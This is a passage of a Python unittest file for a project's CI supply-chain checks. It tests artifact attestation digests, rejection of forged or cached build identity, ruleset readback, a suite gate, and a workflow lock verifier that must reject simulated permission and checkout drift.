                    "CI_WORKFLOW_COMMIT": COMMIT_B,
                    "GITHUB_REPOSITORY": "kevin-zf1123/photospider",
                },
            )
            self.assertEqual((destination / "ci/result.txt").read_text(encoding="utf-8"), "verified\n")
            attestations = gh_log.read_text(encoding="utf-8").splitlines()
            self.assertEqual(len(attestations), 2)
            self.assertTrue(all("--deny-self-hosted-runners" in line for line in attestations))

    def test_targeted_attestation_separates_source_and_signer_digests(self) -> None:
        """Bind candidate source and reusable-workflow signer independently."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            installed = root / "installed-prefix"
            (installed / "include/photospider").mkdir(parents=True)
            (installed / "include/photospider/product.hpp").write_text(
                "#pragma once\n", encoding="utf-8"
            )
            (installed / "lib/cmake/Photospider").mkdir(parents=True)
            (installed / "lib/cmake/Photospider/PhotospiderConfig.cmake").write_text(
                "set(Photospider_FOUND TRUE)\n", encoding="utf-8"
            )
            (installed / "lib/libphotospider.a").write_bytes(b"installed-product")
            archive, manifest, identity = self._create_targeted(
                root, "installed-package", installed
            )
            manifest_sha256 = hashlib.sha256(manifest.read_bytes()).hexdigest()
            binary_dir = root / "bin"
            binary_dir.mkdir()
            gh_log = root / "gh.log"
            github_environment = root / "github-environment"
            github_environment.write_text("", encoding="utf-8")
            gh = binary_dir / "gh"
            gh.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "printf '%q ' \"$@\" >> \"$CI_TEST_GH_LOG\"; "
                "printf '\\n' >> \"$CI_TEST_GH_LOG\"\n"
                "printf '[]\\n'\n",
                encoding="utf-8",
            )
            gh.chmod(0o755)
            run_command(
                "bash",
                SCRIPTS / "targeted_artifact_consume.sh",
                environment={
                    "PATH": f"{binary_dir}:{os.environ['PATH']}",
                    "CI_ARTIFACT_ROLE": "installed-package",
                    "CI_BUILD_PROFILE": "default",
                    "CI_CANDIDATE_COMMIT": COMMIT_A,
                    "CI_IMAGE_DIGEST": IMAGE_DIGEST,
                    "CI_MATRIX_SHA256": str(identity["matrix_sha256"]),
                    "CI_TARGETED_ARCHIVE": str(archive),
                    "CI_TARGETED_MANIFEST": str(manifest),
                    "CI_TARGETED_DESTINATION": str(root / "restored-package"),
                    "CI_TEST_GH_LOG": str(gh_log),
                    "CI_WORKFLOW_COMMIT": COMMIT_B,
                    "GITHUB_ENV": str(github_environment),
                    "GITHUB_REPOSITORY": "kevin-zf1123/photospider",
                },
            )
            attestations = gh_log.read_text(encoding="utf-8").splitlines()
            self.assertEqual(len(attestations), 2)
            for line in attestations:
                self.assertIn(f"--source-digest {COMMIT_A}", line)
                self.assertIn(f"--signer-digest {COMMIT_B}", line)
                self.assertIn(
                    "--signer-workflow "
                    "kevin-zf1123/photospider/.github/workflows/"
                    "ci-integration-suite.yml",
                    line,
                )
            manifest_attestation = next(
                line for line in attestations if "manifest.json" in line
            )
            self.assertIn("photospider-targeted-manifest", manifest_attestation)
            self.assertNotIn(str(manifest), manifest_attestation)
            self.assertEqual(
                github_environment.read_text(encoding="utf-8"),
                "CI_STATIC_PACKAGE_MANIFEST_SHA256="
                + manifest_sha256
                + "\n",
            )

    def test_producer_rejects_cached_empty_and_caller_forged_identity(self) -> None:
        """Reject stale origins, missing measured surfaces, and forged compiler data."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            source = root / "source"
            inventory = self._prepare_build(source)
            common = (
                sys.executable, SCRIPTS / "reusable_build.py",
                "--inventory-dir", inventory,
                "create",
                "--source", source,
                "--archive", root / "candidate.tar.gz",
                "--manifest", root / "candidate.manifest.json",
                "--candidate-commit", COMMIT_A,
                "--profile", "default",
                "--image-digest", IMAGE_DIGEST,
                "--workflow-commit", COMMIT_B,
            )

            stamp = source / ".photospider-ci-build-complete"
            valid_stamp = stamp.read_text(encoding="utf-8")
            stamp.write_text(valid_stamp.replace(f"build_dir={source.resolve()}", "build_dir=/cached/tree"), encoding="utf-8")
            cached = run_command(*common, expect_success=False)
            self.assertIn("completion stamp build_dir mismatch", cached.stderr)
            stamp.write_text(valid_stamp, encoding="utf-8")

            package_config = source / "PhotospiderConfig.cmake"
            valid_config = package_config.read_text(encoding="utf-8")
            package_config.write_text("# empty package surface\n", encoding="utf-8")
            empty = run_command(*common, expect_success=False)
            self.assertIn("component/target inventory is empty", empty.stderr)
            package_config.write_text(valid_config, encoding="utf-8")

            digest = ProfileReaderContractTest._write_complete_versioned_identity(inventory)
            module = self._load_reusable_module()
            measured = module._measured_identity_value(
                REPO_ROOT,
                source,
                inventory,
                COMMIT_A,
                "default",
                digest,
                False,
            )
            measured["compiler"]["cxx_compiler_id"] = "caller-forged"
            (inventory / "reusable_build_identity_v1.json").write_text(
                json.dumps(measured, sort_keys=True, separators=(",", ":"), ensure_ascii=True) + "\n",
                encoding="utf-8",
            )
            forged = run_command(*common, expect_success=False)
            self.assertIn("differs from protected measurement", forged.stderr)

    def test_protected_build_entry_rejects_a_preexisting_output_tree(self) -> None:
        """Execute the maintained freshness helper against cached and empty paths."""
        source = (SCRIPTS / "build_integrity.sh").read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^prepare_fresh_producer_build\(\) \{.*?^\}\n\nprepare_fresh_producer_build$",
            source,
        )
        self.assertIsNotNone(match)
        with tempfile.TemporaryDirectory() as temporary_text:
            repository = Path(temporary_text) / "repository"
            build = repository / "build/ci"
            build.mkdir(parents=True)
            harness = Path(temporary_text) / "fresh-build-contract.sh"
            harness.write_text(
                "#!/usr/bin/env bash\nset -Eeuo pipefail\n" + match.group(0) + "\n",
                encoding="utf-8",
            )
            harness.chmod(0o755)
            cached = run_command(
                "bash", harness,
                environment={"REPO_ROOT": str(repository), "BUILD_DIR": str(build)},
                expect_success=False,
            )
            self.assertIn("refuses a cached or residual build directory", cached.stderr)
            build.rmdir()
            run_command(
                "bash", harness,
                environment={"REPO_ROOT": str(repository), "BUILD_DIR": str(build)},
            )
            self.assertTrue(build.is_dir())
            self.assertFalse(build.is_symlink())


class StaticProductConsumerInputContractTest(unittest.TestCase):
    """Exercise the package-input CLI boundary without running nested builds."""

    @staticmethod
    def _load_consumer_module() -> object:
        """Load the maintained package consumer with dataclass registration."""
        module_path = REPO_ROOT / "tests/integration/static_product_consumer_smoke.py"
        name = "static_product_consumer_input_contract"
        specification = importlib.util.spec_from_file_location(name, module_path)
        if specification is None or specification.loader is None:
            raise AssertionError("cannot load static product consumer module")
        module = importlib.util.module_from_spec(specification)
        sys.modules[name] = module
        sys.path.insert(0, str(module_path.parent))
        try:
            specification.loader.exec_module(module)
        finally:
            sys.path.pop(0)
            sys.modules.pop(name, None)
        return module

    def test_package_inputs_are_paired_disjoint_and_not_cleanup_owned(self) -> None:
        """Accept exact package inputs and reject mixed, linked, or overlapping paths."""
        module = self._load_consumer_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            prefix = root / "artifact/ci/installed"
            metadata = root / "artifact/ci/producer"
            prefix.mkdir(parents=True)
            metadata.mkdir(parents=True)
            (prefix / "prefix-sentinel").write_text("installed\n", encoding="utf-8")
            (metadata / "metadata-sentinel").write_text("metadata\n", encoding="utf-8")
            work = root / "consumer-work"

            def arguments(**overrides: object) -> SimpleNamespace:
                """Return one package-input namespace with selected overrides."""
                values: dict[str, object] = {
                    "build": None,
                    "configure_fresh_producer": False,
                    "installed_prefix": str(prefix),
                    "producer_metadata": str(metadata),
                    "work": str(work),
                }
                values.update(overrides)
                return SimpleNamespace(**values)

            resolved = module.resolve_execution_inputs(arguments(), REPO_ROOT)
            self.assertTrue(resolved.package_input)
            self.assertEqual(resolved.installed_prefix, prefix.resolve())
            self.assertEqual(resolved.build_metadata, metadata.resolve())
            work.mkdir()
            (work / "job-owned").write_text("temporary\n", encoding="utf-8")
            module.strict_remove_tree(work)
            self.assertTrue((prefix / "prefix-sentinel").is_file())
            self.assertTrue((metadata / "metadata-sentinel").is_file())

            invalid = (
                arguments(producer_metadata=None),
                arguments(build=str(root / "build")),
                arguments(configure_fresh_producer=True),
                arguments(work=str(prefix / "nested-work")),
            )
            for value in invalid:
                with self.assertRaises(ValueError):
                    module.resolve_execution_inputs(value, REPO_ROOT)

            link = root / "metadata-link"
            link.symlink_to(metadata, target_is_directory=True)
            with self.assertRaises(ValueError):
                module.resolve_execution_inputs(
                    arguments(producer_metadata=str(link)), REPO_ROOT
                )


class RulesetContractTest(unittest.TestCase):
    """Exercise exact stable checks and coherent default-branch policy."""

    def test_valid_fixture_passes_and_incoherent_fixture_fails(self) -> None:
        """Accept only the exact GitHub Actions-bound stable check pair."""
        base = {
            "conditions": {"ref_name": {"exclude": [], "include": ["~DEFAULT_BRANCH"]}},
            "enforcement": "active",
            "id": 1,
            "name": "main protect",
            "rules": [
                {"type": "deletion"},
                {"type": "non_fast_forward"},
                {"type": "required_linear_history"},
                {
                    "parameters": {
                        "allowed_merge_methods": ["rebase", "squash"],
                        "required_review_thread_resolution": True,
                    },
                    "type": "pull_request",
                },
                {
                    "parameters": {
                        "required_status_checks": [
                            {"context": "healthcheck", "integration_id": 15368},
                            {"context": "integration", "integration_id": 15368},
                        ],
                        "strict_required_status_checks_policy": True,
                    },
                    "type": "required_status_checks",
                },
            ],
            "target": "branch",
        }
        with tempfile.TemporaryDirectory() as temporary_text:
            valid = Path(temporary_text) / "valid.json"
            invalid = Path(temporary_text) / "invalid.json"
            valid.write_text(json.dumps([base]), encoding="utf-8")
            broken = json.loads(json.dumps(base))
            broken["rules"][3]["parameters"]["required_review_thread_resolution"] = False
            broken["rules"][3]["parameters"]["allowed_merge_methods"] = ["merge"]
            invalid.write_text(json.dumps([broken]), encoding="utf-8")
            run_command(
                sys.executable, SCRIPTS / "ruleset_readback.py",
                "--input", valid,
            )
            failed = run_command(
                sys.executable, SCRIPTS / "ruleset_readback.py",
                "--input", invalid,
                expect_success=False,
            )
            self.assertIn("required conversation resolution is disabled", failed.stderr)

    def test_live_readback_aggregates_later_ruleset_pages(self) -> None:
        """Find a second default-branch ruleset after the first 30 summaries."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            binary_dir = root / "bin"
            binary_dir.mkdir()
            gh_log = root / "gh.log"
            gh = binary_dir / "gh"
            gh.write_text(
                f"#!{sys.executable}\n"
                "import json\n"
                "import os\n"
                "import sys\n"
                "args = sys.argv[1:]\n"
                "with open(os.environ['CI_TEST_GH_LOG'], 'a', encoding='utf-8') as handle:\n"
                "    handle.write(json.dumps(args, separators=(',', ':')) + '\\n')\n"
                "endpoint = args[-1]\n"
                "if endpoint.endswith('rulesets?includes_parents=false'):\n"
                "    first = [{'id': identifier} for identifier in range(1, 31)]\n"
                "    second = [{'id': 31}]\n"
                "    print(json.dumps([first, second] if '--paginate' in args and '--slurp' in args else first))\n"
                "else:\n"
                "    identifier = int(endpoint.rsplit('/', 1)[1])\n"
                "    active = identifier in (1, 31)\n"
                "    print(json.dumps({\n"
                "        'conditions': {'ref_name': {'exclude': [], 'include': ['~DEFAULT_BRANCH'] if active else []}},\n"
                "        'enforcement': 'active' if active else 'disabled',\n"
                "        'id': identifier,\n"
                "        'name': f'ruleset-{identifier}',\n"
                "        'rules': [],\n"
                "        'target': 'branch',\n"
                "    }))\n",
                encoding="utf-8",
            )
            gh.chmod(0o755)
            failed = run_command(
                sys.executable, SCRIPTS / "ruleset_readback.py",
                "--repository", "kevin-zf1123/photospider",
                environment={
                    "CI_TEST_GH_LOG": str(gh_log),
                    "PATH": f"{binary_dir}:{os.environ['PATH']}",
                },
                expect_success=False,
            )
            self.assertIn("expected exactly one active default-branch ruleset, found 2", failed.stderr)
            calls = [json.loads(line) for line in gh_log.read_text(encoding="utf-8").splitlines()]
            list_call = calls[0]
            self.assertIn("--paginate", list_call)
            self.assertIn("--slurp", list_call)
            self.assertIn(
                "repos/kevin-zf1123/photospider/rulesets?includes_parents=false",
                list_call,
            )
            self.assertTrue(any(call[-1].endswith("/rulesets/31") for call in calls))


class IntegrationSuiteGateContractTest(unittest.TestCase):
    """Exercise the protected suite gate as an actual process boundary."""

    @staticmethod
    def _load_gate_module() -> object:
        """Load the protected gate helper for its canonical result inventory."""
        module_path = SCRIPTS / "integration_suite_gate.py"
        specification = importlib.util.spec_from_file_location(
            "integration_suite_gate_contract", module_path
        )
        if specification is None or specification.loader is None:
            raise AssertionError("cannot load integration suite gate")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    @classmethod
    def _successful_environment(
        cls, publish: str = "false"
    ) -> dict[str, str]:
        """Return the complete successful result/attestation environment."""
        module = cls._load_gate_module()
        environment = {
            variable: "success" for _, variable in module.REQUIRED_RESULTS
        }
        environment.update(
            {
                "CI_ATTESTATION_RESULT": (
                    "success" if publish == "true" else "skipped"
                ),
                "CI_IMAGE_DIGEST": IMAGE_DIGEST,
                "CI_PUBLISH_REUSABLE_ATTESTATIONS": publish,
                "CI_ROUTE_SHA256": "4" * 64,
            }
        )
        return environment

    def _run_gate(
        self,
        output: Path,
        environment: dict[str, str],
        *,
        expect_success: bool,
    ) -> subprocess.CompletedProcess[str]:
        """Execute the real gate CLI against one retained temporary output."""
        return run_command(
            sys.executable,
            SCRIPTS / "integration_suite_gate.py",
            "--output",
            output,
            environment=environment,
            expect_success=expect_success,
        )

    def test_gate_writes_only_after_complete_readonly_or_publishing_success(self) -> None:
        """Accept exact attest success/skip pairs and append one digest output."""
        for publish in ("false", "true"):
            with self.subTest(publish=publish), tempfile.TemporaryDirectory() as text:
                output = Path(text) / "github-output"
                output.write_text("", encoding="utf-8")
                self._run_gate(
                    output,
                    self._successful_environment(publish),
                    expect_success=True,
                )
                self.assertEqual(
                    output.read_text(encoding="utf-8"),
                    f"validated_image_digest={IMAGE_DIGEST}\n",
                )

    def test_every_required_result_and_attestation_drift_fails_without_output(self) -> None:
        """Reject failed, skipped, or unknown required results and trust drift."""
        module = self._load_gate_module()
        for job_name, variable in module.REQUIRED_RESULTS:
            for result in ("failure", "failed", "skipped", "unknown"):
                with self.subTest(job=job_name, result=result), tempfile.TemporaryDirectory() as text:
                    output = Path(text) / "github-output"
                    output.write_text("", encoding="utf-8")
                    environment = self._successful_environment()
                    environment[variable] = result
                    completed = self._run_gate(
                        output, environment, expect_success=False
                    )
                    self.assertIn(job_name, completed.stderr)
                    self.assertEqual(output.read_text(encoding="utf-8"), "")

        attestation_cases = (
            ("true", "skipped"),
            ("true", "unknown"),
            ("false", "success"),
            ("false", "failure"),
            ("unknown", "skipped"),
        )
        for publish, attestation in attestation_cases:
            with self.subTest(
                publish=publish, attestation=attestation
            ), tempfile.TemporaryDirectory() as text:
                output = Path(text) / "github-output"
                output.write_text("", encoding="utf-8")
                environment = self._successful_environment()
                environment["CI_PUBLISH_REUSABLE_ATTESTATIONS"] = publish
                environment["CI_ATTESTATION_RESULT"] = attestation
                self._run_gate(output, environment, expect_success=False)
                self.assertEqual(output.read_text(encoding="utf-8"), "")

        with tempfile.TemporaryDirectory() as text:
            output = Path(text) / "github-output"
            output.write_text("", encoding="utf-8")
            environment = self._successful_environment()
            environment["CI_IMAGE_DIGEST"] = "sha256:invalid"
            self._run_gate(output, environment, expect_success=False)
            self.assertEqual(output.read_text(encoding="utf-8"), "")


class LockSurfaceContractTest(unittest.TestCase):
    """Exercise the complete active protected lock/workflow verifier."""

    @staticmethod
    def _load_lock_module() -> object:
        """Load the protected lock verifier for isolated workflow fixtures."""
        module_path = SCRIPTS / "ci_lock_verify.py"
        specification = importlib.util.spec_from_file_location(
            "ci_lock_verify_contract", module_path
        )
        if specification is None or specification.loader is None:
            raise AssertionError("cannot load CI lock verifier")
        module = importlib.util.module_from_spec(specification)
        specification.loader.exec_module(module)
        return module

    @staticmethod
    def _replace_workflow_job_fragment(
        workflow: str,
        job_name: str,
        original: str,
        replacement: str,
    ) -> str:
        """Replace one exact fragment only inside a named top-level job.

        Args:
            workflow: Complete maintained workflow text.
            job_name: Exact two-space-indented job identifier.
            original: Fragment required exactly once in the selected job.
            replacement: Text that replaces ``original`` in that job.

        Returns:
            The complete workflow with the selected job changed.

        Raises:
            AssertionError: The job is absent or the fragment is not unique in
                that job.

        Note:
            Scoping mutations prevents an unrelated caller or sibling job from
            accidentally satisfying a negative permission fixture.
        """
        start_marker = f"  {job_name}:\n"
        matched_start = re.search(
            rf"(?m)^  {re.escape(job_name)}:\n", workflow
        )
        if matched_start is None:
            raise AssertionError(f"workflow job is absent: {job_name}")
        start = matched_start.start()
        following = re.search(r"(?m)^  [a-z][a-z0-9_-]*:\n", workflow[start + len(start_marker) :])
        end = (
            len(workflow)
            if following is None
            else start + len(start_marker) + following.start()
        )
        block = workflow[start:end]
        if block.count(original) != 1:
            raise AssertionError(
                f"job {job_name} does not contain one exact fragment: {original!r}"
            )
        return workflow[:start] + block.replace(original, replacement, 1) + workflow[end:]

    @staticmethod
    def _write_image_fixture(
        root: Path,
        *,
        dockerfile: str,
        image_lock: dict[str, object],
        package_lock: str,
        snapshot_source: str,
        installer: str,
        suite_gate: str,
    ) -> None:
        """Materialize one complete protected image-input fixture.

        Args:
            root: Empty temporary fixture root.
            dockerfile: Active Dockerfile variant.
            image_lock: Strict image lock variant.
            package_lock: Exact Ubuntu package lock variant.
            snapshot_source: Canonical Deb822 source variant.
            installer: Protected Bash installer variant.
            suite_gate: Protected Python suite-gate variant.

        Returns:
            None after copying every canonical image input and overwriting the
            explicit variants under test.

        Raises:
            AssertionError: The input inventory is malformed.

        Note:
            Copying the full locked inventory makes `_verify_image_lock` and
            `_verify_dockerfile` exercise the same regular-file boundary as the
            production repository rather than a partial fixture shortcut.
        """
        input_paths = image_lock.get("input_paths")
        if not isinstance(input_paths, list) or not all(
            isinstance(path, str) for path in input_paths
        ):
            raise AssertionError("fixture image input inventory is malformed")
        for relative in input_paths:
            source_path = REPO_ROOT / relative
            destination = root / relative
            destination.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source_path, destination)
        (root / "Dockerfile.ci").write_text(dockerfile, encoding="utf-8")
        (root / "ci/locks/ci-image-lock.json").write_text(
            json.dumps(image_lock, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        (root / "ci/locks/ubuntu-24.04-packages.lock").write_text(
            package_lock, encoding="utf-8"
        )
        (root / "ci/locks/ubuntu-24.04-snapshot.sources.in").write_text(
            snapshot_source, encoding="utf-8"
        )
        (root / "ci/scripts/ci_image_install.sh").write_text(
            installer, encoding="utf-8"
        )
        (root / "ci/scripts/integration_suite_gate.py").write_text(
            suite_gate, encoding="utf-8"
        )

    @staticmethod
    def _rebind_helper_hash(
        image_lock: dict[str, object], helper_name: str, source: str
    ) -> dict[str, object]:
        """Return a deep-copied lock with one attacker-recomputed helper hash."""
        rebound = json.loads(json.dumps(image_lock))
        helpers = rebound["protected_helpers"]
        helpers[helper_name]["sha256"] = hashlib.sha256(source.encode()).hexdigest()
        return rebound

    def test_protected_helper_retained_snapshot_rejects_path_and_byte_drift(
        self,
    ) -> None:
        """Reject links, special files, path swaps, and in-place read mutation."""
        module = self._load_lock_module()
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            protected = root / "protected-helper.py"
            content = b"print('protected helper')\n"
            protected.write_bytes(content)
            self.assertEqual(
                module._sha256_regular_file(protected, "fixture helper"),
                hashlib.sha256(content).hexdigest(),
            )

            symlink = root / "initial-symlink.py"
            symlink.symlink_to(protected)
            fifo = root / "helper.fifo"
            os.mkfifo(fifo)
            unsafe_paths = (symlink, fifo, Path("/dev/null"))
            for unsafe_path in unsafe_paths:
                with self.subTest(unsafe_path=unsafe_path), self.assertRaises(
                    module.ContractError
                ):
                    module._sha256_regular_file(unsafe_path, "unsafe helper")

            alias = root / "same-inode-alias.py"
            os.link(protected, alias)

            def swap_path(phase: str, _descriptor: int) -> None:
                """Atomically replace the measured name with a same-inode symlink."""
                if phase != "after_open":
                    return
                replacement = root / "replacement-symlink.py"
                replacement.symlink_to(alias)
                os.replace(replacement, protected)

            with self.assertRaises(module.ContractError) as swapped:
                module._sha256_regular_file(
                    protected, "swapped helper", _test_hook=swap_path
                )
            self.assertIn("protected helper", str(swapped.exception))

        with tempfile.TemporaryDirectory() as temporary_text:
            protected = Path(temporary_text) / "mutable-helper.py"
            original = b"abcdefgh"
            replacement = b"ABCDEFGH"
            protected.write_bytes(original)

            def mutate_bytes(phase: str, _descriptor: int) -> None:
                """Rewrite the same inode after its first complete retained read."""
                if phase != "after_first_read":
                    return
                with protected.open("r+b") as handle:
                    handle.write(replacement)
                    handle.flush()
                    os.fsync(handle.fileno())

            with self.assertRaises(module.ContractError) as mutated:
                module._sha256_regular_file(
                    protected, "mutated helper", _test_hook=mutate_bytes
                )
            self.assertIn("changed during retained read", str(mutated.exception))

    def test_reusable_permission_ceiling_is_structurally_isolated(self) -> None:
        """Accept three exact callers and reject every inheritance/elevation drift."""
        module = self._load_lock_module()
        module._verify_reusable_workflow_permissions(REPO_ROOT)
        caller_path = REPO_ROOT / ".github/workflows/ci-integration.yml"
        shared_path = REPO_ROOT / ".github/workflows/ci-integration-suite.yml"
        caller = caller_path.read_text(encoding="utf-8")
        shared = shared_path.read_text(encoding="utf-8")
        cases = (
            (
                "readonly-write",
                "caller",
                "published-image-integration-readonly",
                "      attestations: read\n",
                "      attestations: write\n",
                "caller published-image-integration-readonly permissions differ",
            ),
            (
                "readonly-publication",
                "caller",
                "published-image-integration-readonly",
                "      publish_reusable_attestations: false\n",
                "      publish_reusable_attestations: true\n",
                "caller published-image-integration-readonly publication mode differs",
            ),
            (
                "trusted-downgrade",
                "caller",
                "published-image-integration-trusted",
                "      artifact-metadata: write\n",
                "      artifact-metadata: read\n",
                "caller published-image-integration-trusted permissions differ",
            ),
            (
                "readonly-selects-control-commit",
                "caller",
                "published-image-integration-readonly",
                "      workflow_commit: ${{ github.workflow_sha }}\n",
                "      workflow_commit: ${{ github.sha }}\n",
                "caller published-image-integration-readonly can select its control commit",
            ),
            (
                "trusted-selects-control-commit",
                "caller",
                "published-image-integration-trusted",
                "      workflow_commit: ${{ github.workflow_sha }}\n",
                "      workflow_commit: ${{ github.sha }}\n",
                "caller published-image-integration-trusted can select its control commit",
            ),
            (
                "candidate-selects-control-commit",
                "caller",
                "candidate-image-integration",
                "      workflow_commit: ${{ github.workflow_sha }}\n",
                "      workflow_commit: ${{ github.sha }}\n",
                "caller candidate-image-integration can select its control commit",
            ),
            (
                "execution-inherits",
                "shared",
                "identity-preflight",
                (
                    "    permissions:\n"
                    "      attestations: read\n"
                    "      contents: read\n"
                    "      packages: read\n"
                ),
                "",
                "job identity-preflight read-only permissions differ",
            ),
            (
                "execution-write",
                "shared",
                "sanitizer-asan-darwin",
                "      contents: read\n",
                "      contents: write\n",
                "job sanitizer-asan-darwin read-only permissions differ",
            ),
            (
                "attestation-local-permissions",
                "shared",
                "attest-targeted-artifacts",
                "    runs-on: ubuntu-24.04\n",
                "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n",
                "attest-targeted-artifacts must inherit the trusted caller ceiling",
            ),
            (
                "attestation-condition",
                "shared",
                "attest-targeted-artifacts",
                "        inputs.publish_reusable_attestations &&\n",
                "        true &&\n",
                "attest-targeted-artifacts trust condition differs",
            ),
        )
        for label, owner, job_name, original, replacement, diagnostic in cases:
            with self.subTest(
                permission_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                mutated_caller = caller
                mutated_shared = shared
                if owner == "caller":
                    mutated_caller = self._replace_workflow_job_fragment(
                        caller, job_name, original, replacement
                    )
                else:
                    mutated_shared = self._replace_workflow_job_fragment(
                        shared, job_name, original, replacement
                    )
                (workflow_root / "ci-integration.yml").write_text(
                    mutated_caller, encoding="utf-8"
                )
                (workflow_root / "ci-integration-suite.yml").write_text(
                    mutated_shared, encoding="utf-8"
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_reusable_workflow_permissions(root)
                self.assertIn(diagnostic, str(raised.exception))

    def test_protected_build_smoke_control_rejects_authority_drift(self) -> None:
        """Reject checkout, path, program, matrix, digest, and attestation drift.

        Returns:
            None after every isolated workflow mutation is rejected by the real
            structured protected-control verifier.

        Raises:
            AssertionError: A candidate-selected commit, overlapping path,
                wrong artifact, extra candidate command, producer routing,
                producer matrix, missing route digest, or unbound attestation
                satisfies the contract.

        Note:
            Each fixture copies only the workflow and protected action lock;
            no candidate code, action, or external service executes.
        """
        module = self._load_lock_module()
        module._verify_build_smoke_control_authority(REPO_ROOT)
        workflow_path = REPO_ROOT / ".github/workflows/ci-integration-suite.yml"
        workflow = workflow_path.read_text(encoding="utf-8")
        cases = (
            (
                "candidate-selects-control-commit",
                "build-smoke-control",
                "          ref: ${{ inputs.workflow_commit }}\n",
                "          ref: ${{ inputs.candidate_commit }}\n",
                "protected control/candidate/raw checkout mapping differs",
            ),
            (
                "control-candidate-path-overlap",
                "build-smoke-control",
                "          path: .ci-route-candidate-source\n",
                "          path: .ci-protected-route-control\n",
                "protected control/candidate/raw checkout mapping differs",
            ),
            (
                "wrong-raw-artifact",
                "build-smoke-control",
                "          name: ci-build-smoke-raw-default\n",
                "          name: ci-control-default\n",
                "protected control/candidate/raw checkout mapping differs",
            ),
            (
                "candidate-command-before-control",
                "build-smoke-control",
                "          set -Eeuo pipefail\n",
                (
                    "          set -Eeuo pipefail\n"
                    "          python3 .ci-route-candidate-source/ci/scripts/"
                    "build_smoke_route.py\n"
                ),
                "protected route program identity differs",
            ),
            (
                "producer-routes-after-cmake",
                "build-integrity-default",
                "          set -Eeuo pipefail\n          python3 - <<'PY'\n",
                (
                    "          set -Eeuo pipefail\n"
                    "          python3 ci/scripts/build_smoke_route.py\n"
                    "          python3 - <<'PY'\n"
                ),
                "raw inventory producer program identity differs",
            ),
            (
                "raw-package-loses-bash",
                "build-integrity-default",
                (
                    "      - name: Package exact raw routing inputs without "
                    "candidate parsers\n        shell: bash\n"
                ),
                (
                    "      - name: Package exact raw routing inputs without "
                    "candidate parsers\n"
                ),
                "raw inventory identities differ",
            ),
            (
                "role-pack-loses-bash",
                "build-integrity-default",
                (
                    "      - name: Pack role-specific identity-bound artifacts\n"
                    "        id: identity\n        shell: bash\n"
                ),
                (
                    "      - name: Pack role-specific identity-bound artifacts\n"
                    "        id: identity\n"
                ),
                "role-artifact pack program/shell differs",
            ),
            (
                "consumer-trusts-producer-matrix",
                "build-smoke",
                "needs.build-smoke-control.outputs.build_smoke_matrix",
                "needs.build-integrity-default.outputs.build_smoke_matrix",
                "build-smoke matrix authority differs",
            ),
            (
                "consumer-omits-route-digest",
                "producer-build-smoke",
                "      needs.build-smoke-control.outputs.route_sha256 != '' &&\n",
                "",
                "producer-build-smoke route digest is unbound",
            ),
            (
                "attestation-omits-route-digest",
                "attest-targeted-artifacts",
                "        needs.build-smoke-control.outputs.route_sha256 != '' &&\n",
                "",
                "artifact attestation omits route digest",
            ),
            (
                "targeted-candidate-selects-workflow",
                "verify-targeted-artifacts",
                "          ref: ${{ inputs.checkout_ref }}\n",
                "          ref: ${{ inputs.workflow_commit }}\n",
                "targeted verifier candidate-data checkout mapping differs",
            ),
            (
                "targeted-candidate-overlaps-control",
                "verify-targeted-artifacts",
                "          path: .ci-targeted-verifier-candidate\n",
                "          path: .ci-targeted-verifier-control\n",
                "targeted verifier candidate-data checkout mapping differs",
            ),
            (
                "targeted-raw-artifact-substitution",
                "verify-targeted-artifacts",
                "          path: .ci-targeted-verifier-raw\n",
                "          path: .ci-targeted-verifier-candidate\n",
                "targeted verifier raw-inventory download mapping differs",
            ),
            (
                "targeted-executes-candidate-helper",
                "verify-targeted-artifacts",
                "          set -Eeuo pipefail\n",
                (
                    "          set -Eeuo pipefail\n"
                    "          python3 .ci-targeted-verifier-candidate/ci/scripts/"
                    "reusable_build.py\n"
                ),
                "targeted verifier executes candidate control",
            ),
            (
                "targeted-coverage-crossbind-deleted",
                "verify-targeted-artifacts",
                "            verify-ordinary-coverage \\\n",
                "            verify-only-placeholder \\\n",
                "targeted verifier lacks protected route binding verify-ordinary-coverage",
            ),
        )
        for label, job_name, original, replacement, diagnostic in cases:
            with self.subTest(
                protected_route_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                lock_root = root / "ci/locks"
                lock_root.mkdir(parents=True)
                shutil.copy2(
                    REPO_ROOT / "ci/locks/actions.lock",
                    lock_root / "actions.lock",
                )
                mutated = self._replace_workflow_job_fragment(
                    workflow, job_name, original, replacement
                )
                (workflow_root / "ci-integration-suite.yml").write_text(
                    mutated, encoding="utf-8"
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_build_smoke_control_authority(root)
                self.assertIn(diagnostic, str(raised.exception))

    def test_ci_image_producer_complete_mapping_rejects_every_drift(self) -> None:
        """Reject producer trigger, permission, build, tag, and step drift."""
        module = self._load_lock_module()
        actions = module._read_actions(REPO_ROOT / "ci/locks/actions.lock")
        module._verify_ci_image_producer(REPO_ROOT, actions)
        producer_path = REPO_ROOT / ".github/workflows/build-ci-image.yml"
        producer = producer_path.read_text(encoding="utf-8")
        build_action = (
            "docker/build-push-action@"
            f"{actions['docker/build-push-action'][1]}"
        )
        cases = (
            (
                "deleted-prebuild-verifier",
                (
                    "      - name: Verify protected locks\n"
                    "        run: python3 ci/scripts/ci_lock_verify.py\n\n"
                ),
                "",
            ),
            (
                "second-shell-build",
                "      - name: Attest exact temporary OCI subject\n",
                (
                    "      - name: Unexpected second Docker build\n"
                    "        run: docker buildx build --push --tag "
                    "ghcr.io/example/ci:second .\n\n"
                    "      - name: Attest exact temporary OCI subject\n"
                ),
